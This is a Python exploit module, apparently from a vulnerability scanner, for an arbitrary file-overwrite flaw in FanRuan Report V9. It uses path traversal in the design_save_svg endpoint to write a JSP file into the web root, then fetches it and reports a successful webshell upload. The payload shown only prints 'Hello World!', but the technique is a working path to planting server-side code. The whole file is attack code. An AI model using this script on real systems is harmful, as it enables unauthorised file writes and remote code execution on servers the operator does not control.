import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging


headersx = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
}
def 帆软_v9_design_文件覆盖上传(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
        "Content-Type": "application/json",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Upgrade-Insecure-Requests": "1"
    }
    exp_url = urldata + "WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp"
    data = '''{"__CONTENT__":"<%out.println(\"Hello World!\");%>","__CHARSET__":"UTF-8"}'''
    shell_url = urldata + "WebReport/update.jsp"
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(exp_url, headers=headers, data=data, verify=False)
        respones = requests.get(shell_url, headers=headersx, verify=False)
        if respones.status_code == 200 and 'Hello' in respones.text:
            shell_url = urldata + "WebReport/update.jsp"
            print(Vcolors.RED + "[+] 上传webshell成功{}".format(shell_url)+Vcolors.ENDC)
        else:
            print(Vcolors.WARNING +"[x]  帆软报表 V9 design_save_svg 任意文件覆盖文件上传漏洞不存在" + Vcolors.ENDC)
    except:
        logging.error("帆软_v9_design_文件覆盖上传脚本出现异常")

